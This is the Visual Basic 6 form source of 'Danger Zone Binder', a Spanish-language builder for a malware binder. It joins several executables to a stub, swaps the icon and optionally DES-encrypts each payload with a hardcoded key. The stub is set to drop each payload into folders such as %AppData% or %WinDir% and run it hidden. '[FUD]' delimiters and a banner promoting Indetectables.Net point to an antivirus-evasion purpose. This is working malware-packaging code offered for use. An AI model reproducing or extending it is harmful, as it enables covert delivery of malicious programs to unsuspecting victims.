VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MsComCtl.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{B389CD47-E20E-4D96-A4EC-576F2B1F43BF}#1.0#0"; "Hook-Menu-2.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Danger Zone Binder"
   ClientHeight    =   5820
   ClientLeft      =   2550
   ClientTop       =   2610
   ClientWidth     =   9750
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":D626
   ScaleHeight     =   5820
   ScaleWidth      =   9750
   Begin VB.TextBox iconpath 
      Height          =   285
      Left            =   9960
      TabIndex        =   4
      Top             =   1920
      Width           =   1095
   End
   Begin MSComctlLib.ImageList IM 
      Left            =   9240
      Top             =   1320
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   6
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C742A
            Key             =   "ruta"
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C79C4
            Key             =   "size"
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C7F5E
            Key             =   "extra"
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C84F8
            Key             =   "tipoE"
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C8A92
            Key             =   "Encript"
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C902C
            Key             =   "Run"
         EndProperty
      EndProperty
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   9240
      Top             =   840
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin Proyecto1.Button cmdIcon 
      Height          =   375
      Left            =   2280
      TabIndex        =   1
      Top             =   5040
      Width           =   1215
      _ExtentX        =   2143
      _ExtentY        =   661
      ButtonStyle     =   7
      PictureAlignment=   1
      BackColor       =   12632256
      BackColorPressed=   15715986
      BackColorHover  =   16243621
      BorderColor     =   9408398
      BorderColorPressed=   6045981
      BorderColorHover=   11632444
      EffectColor     =   4210752
      Caption         =   "    Icono"
      Picture         =   "Form1.frx":C95C6
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin MSComctlLib.ListView LV 
      Height          =   2055
      Left            =   480
      TabIndex        =   0
      Top             =   2880
      Width           =   8775
      _ExtentX        =   15478
      _ExtentY        =   3625
      View            =   3
      MultiSelect     =   -1  'True
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ColHdrIcons     =   "IM"
      ForeColor       =   -2147483640
      BackColor       =   15658734
      BorderStyle     =   1
      Appearance      =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Segoe UI"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   7
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Ruta"
         Object.Width           =   3246
         ImageIndex      =   1
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Tamaño"
         Object.Width           =   2540
         ImageIndex      =   2
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Extracción"
         Object.Width           =   2540
         ImageIndex      =   3
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Nombre de Extracción"
         Object.Width           =   3951
         ImageIndex      =   4
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Ejecutar"
         Object.Width           =   2556
         ImageIndex      =   6
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   5
         Text            =   "Encriptar"
         Object.Width           =   2840
         ImageIndex      =   5
      EndProperty
      BeginProperty ColumnHeader(7) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   6
         Text            =   "Ejecución"
         Object.Width           =   2540
      EndProperty
      Picture         =   "Form1.frx":C9B60
   End
   Begin Proyecto1.Button cmdBuild 
      Height          =   375
      Left            =   4200
      TabIndex        =   2
      Top             =   5040
      Width           =   1215
      _ExtentX        =   2143
      _ExtentY        =   661
      ButtonStyle     =   7
      PictureAlignment=   1
      BackColor       =   12632256
      BackColorPressed=   15715986
      BackColorHover  =   16243621
      BorderColor     =   9408398
      BorderColorPressed=   6045981
      BorderColorHover=   11632444
      Caption         =   "      Construir"
      Picture         =   "Form1.frx":CD3AD
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin Proyecto1.Button Button1 
      Height          =   375
      Left            =   6120
      TabIndex        =   3
      Top             =   5040
      Width           =   1215
      _ExtentX        =   2143
      _ExtentY        =   661
      ButtonStyle     =   7
      PictureAlignment=   1
      BackColor       =   12632256
      BackColorPressed=   15715986
      BackColorHover  =   16243621
      BorderColor     =   9408398
      BorderColorPressed=   6045981
      BorderColorHover=   11632444
      Caption         =   "      About"
      Picture         =   "Form1.frx":CD947
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin HookMenu.ctxHookMenu ctxHookMenu1 
      Left            =   9240
      Top             =   360
      _ExtentX        =   900
      _ExtentY        =   900
      BmpCount        =   17
      Bmp:1           =   "Form1.frx":CDEE1
      Key:1           =   "#AddFile"
      Bmp:2           =   "Form1.frx":CE309
      Key:2           =   "#DeleteFile"
      Bmp:3           =   "Form1.frx":CE731
      Key:3           =   "#Clear"
      Bmp:4           =   "Form1.frx":CEB59
      Key:4           =   "#ExtractIn"
      Bmp:5           =   "Form1.frx":CEF81
      Key:5           =   "#Ejecutar"
      Bmp:6           =   "Form1.frx":CF3A9
      Key:6           =   "#Crypt"
      Bmp:7           =   "Form1.frx":CF7D1
      Key:7           =   "#eSi"
      Bmp:8           =   "Form1.frx":CFBF9
      Key:8           =   "#eNo"
      Bmp:9           =   "Form1.frx":D0021
      Key:9           =   "#cSi"
      Bmp:10          =   "Form1.frx":D0449
      Key:10          =   "#cNo"
      Bmp:11          =   "Form1.frx":D0871
      Key:11          =   "#AppData"
      Bmp:12          =   "Form1.frx":D0C99
      Key:12          =   "#tmp"
      Bmp:13          =   "Form1.frx":D10C1
      Key:13          =   "#WinDir"
      Bmp:14          =   "Form1.frx":D14E9
      Key:14          =   "#HomeDrive"
      Bmp:15          =   "Form1.frx":D1911
      Key:15          =   "#Tipo"
      Bmp:16          =   "Form1.frx":D1D39
      Key:16          =   "#Oculto"
      Bmp:17          =   "Form1.frx":D2161
      Key:17          =   "#Visible"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Menu Menu 
      Caption         =   "MenuB"
      Visible         =   0   'False
      Begin VB.Menu AddFile 
         Caption         =   "Agregar"
      End
      Begin VB.Menu DeleteFile 
         Caption         =   "Eliminar"
      End
      Begin VB.Menu Clear 
         Caption         =   "Limpiar"
      End
      Begin VB.Menu separador 
         Caption         =   "-"
      End
      Begin VB.Menu ExtractIn 
         Caption         =   "Extraer en:"
         Begin VB.Menu AppData 
            Caption         =   "%AppData%"
         End
         Begin VB.Menu tmp 
            Caption         =   "%TEMP%"
         End
         Begin VB.Menu WinDir 
            Caption         =   "%WinDir%"
         End
         Begin VB.Menu HomeDrive 
            Caption         =   "%HomeDrive%"
         End
      End
      Begin VB.Menu Ejecutar 
         Caption         =   "Ejecutar"
         Begin VB.Menu eSi 
            Caption         =   "Si"
         End
         Begin VB.Menu eNo 
            Caption         =   "No"
         End
      End
      Begin VB.Menu Crypt 
         Caption         =   "Encriptar"
         Begin VB.Menu cSi 
            Caption         =   "Si"
         End
         Begin VB.Menu cNo 
            Caption         =   "No"
         End
      End
      Begin VB.Menu Tipo 
         Caption         =   "Tipo de Ejecución"
         Begin VB.Menu Oculto 
            Caption         =   "Oculto"
         End
         Begin VB.Menu Visible 
            Caption         =   "Visible"
         End
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Sub InitCommonControls Lib "comctl32" ()

Dim Box     As String
Dim Free    As Long
Dim Stub    As String
Dim i       As Integer
Dim Data    As String
Dim Final   As String
Dim DES     As New clsDES

Private Sub AddFile_Click()

With CD
    .DialogTitle = "Selecciona un archivo"
    .Filter = "Todos los archivos|*.*"
    .ShowOpen
End With

If CD.Filename = vbNullString Then Exit Sub

Box = InputBox("Coloque el nombre de extracción y extensión del archivo", Me.Caption, "Archivo.exe")

With LV.ListItems.Add(, , CD.Filename)
     
    .SubItems(1) = FileLen(CD.Filename) & " Bytes"
    .SubItems(2) = "%AppData%"
    .SubItems(3) = Box
    .SubItems(4) = "Si"
    .SubItems(5) = "No"
    .SubItems(6) = "Visible"
End With
End Sub

Private Sub AppData_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(2) = "%AppData%"

End Sub

Private Sub Button1_Click()

frmMain.Hide

frmAbout.Show vbModal

End Sub

Private Sub Clear_Click()

LV.ListItems.Clear

End Sub

Private Sub cmdBuild_Click()

If CD.Filename = vbNullString Then Exit Sub

If LV.ListItems.Count = 1 Then Exit Sub


With CD
    .DialogTitle = "Seleccione donde guardar el archivo"
    .Filter = "Ejecutables EXE|*.exe"
    .ShowSave
End With

If CD.Filename = vbNullString Then Exit Sub

Free = FreeFile

Open App.Path & "\Stub.dll" For Binary As Free
    Stub = Space$(LOF(Free))
    Get Free, , Stub
Close Free
'LOOOOOOOOOL

Open CD.Filename For Binary As Free
    Put Free, , Stub
Close Free

If Not iconpath = "" Then Call ChangeIcon(CD.Filename, iconpath)

Final = ""

For i = 1 To LV.ListItems.Count

        Open LV.ListItems(i).Text For Binary As Free
            Data = Space$(LOF(Free))
            Get Free, , Data
        Close Free
        
    If LV.ListItems(i).SubItems(5) = "Si" Then
        Data = DES.EncryptString(Data, "ACM1PT")
    Else
        Data = Data
    End If
            
    Final = Final & "[DZB]" & Data & "[FUD]" & Replace(LV.ListItems(i).SubItems(2), "%", "") & "[FUD]" & LV.ListItems(i).SubItems(3) & "[FUD]" & LV.ListItems(i).SubItems(4) & "[FUD]" & LV.ListItems(i).SubItems(5) & "[FUD]" & LV.ListItems(i).SubItems(6) & "[FUD]"
    
Next i
    
    Open CD.Filename For Binary As Free
        Put Free, LOF(Free) + 1, Final
    Close Free

MsgBox "Archivo(s) Bindeados Exitosamente en: " & vbNewLine & CD.Filename, vbInformation, Me.Caption

End Sub

Private Sub cmdIcon_Click()

    With CD
        .Filename = vbNullString
        .DialogTitle = "Escoge el icono"
        .Filter = "Icono|*.ico"
        .ShowOpen
    End With
    
    If CD.Filename = vbNullString Then Exit Sub
    iconpath = CD.Filename
    
End Sub


Private Sub cNo_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(5) = "No"

End Sub

Private Sub cSi_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(5) = "Si"

End Sub

Private Sub DeleteFile_Click()

On Error Resume Next
LV.ListItems.Remove (LV.SelectedItem.Index)

End Sub

Private Sub eNo_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(4) = "No"

End Sub

Private Sub eSi_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(4) = "Si"

End Sub

Private Sub Form_Load()

MsgBox "Visita Www.Indetectables.Net", vbInformation, "Aviso..."

ctxHookMenu1.MenuLook = MenuXP

End Sub

Private Sub HomeDrive_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(2) = "%HomeDrive%"

End Sub

Private Sub LV_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)

    If Button = 2 Then PopupMenu Menu

End Sub

Private Sub Oculto_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(6) = "Oculto"

End Sub

Private Sub tmp_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(2) = "%TEMP%"

End Sub

Private Sub Visible_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(6) = "Visible"

End Sub

Private Sub WinDir_Click()

If CD.Filename = vbNullString Then Exit Sub
LV.SelectedItem.SubItems(2) = "%WinDir%"

End Sub
